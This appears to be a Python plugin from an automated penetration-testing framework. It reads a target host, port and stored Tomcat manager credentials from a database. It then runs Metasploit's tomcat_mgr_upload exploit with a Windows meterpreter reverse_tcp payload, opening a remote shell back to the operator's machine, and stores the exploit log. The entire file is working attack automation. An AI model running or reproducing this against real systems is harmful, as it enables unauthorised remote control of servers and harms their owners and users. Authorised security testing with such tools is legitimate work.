from msf import exploit

def run(params):
    sql = "select hd.id, hd.ip_address, pd.port_number, v.details from host_data hd join port_data pd on hd.id = pd.host_data_id join vulnerabilities v on v.port_data_id = pd.id where v.id = %s"
    cursor = params.db.cursor()
    cursor.execute(sql, params.item_identifier)
    row = cursor.fetchone()
    #print "exploit weak tomcat creds on host {0}".format(row[1])
    params.log("exploit weak tomcat creds on host {0}".format(row[1]))
    cursor.close()
    
    creds = row[3].split(":")
    
    setup = [
        "use exploit/multi/http/tomcat_mgr_upload", 
        "set PAYLOAD windows/meterpreter/reverse_tcp", 
        "set RHOST {0}".format(row[1]),
        "set RPORT {0}".format(row[2]),
        "set LHOST {0}".format(params.getLocalHost()),
        "set LPORT {0}".format(params.getOpenPort()),
        "set TARGET 1",
        "set username {0}".format(creds[0]),
        "set password {0}".format(creds[1]),
        "exploit"
    ]
    
    log = ""
    for l in exploit.runMsf(params, row[0], setup, "tomcat_creds"):
        log = log + l + "\r\n"
    
    cursor = params.db.cursor()
    cursor.execute("insert into exploit_logs (host_data_id, vulnerability_description_id, log) values(%s, %s, %s)", (row[0], 3, log))
    cursor.close()
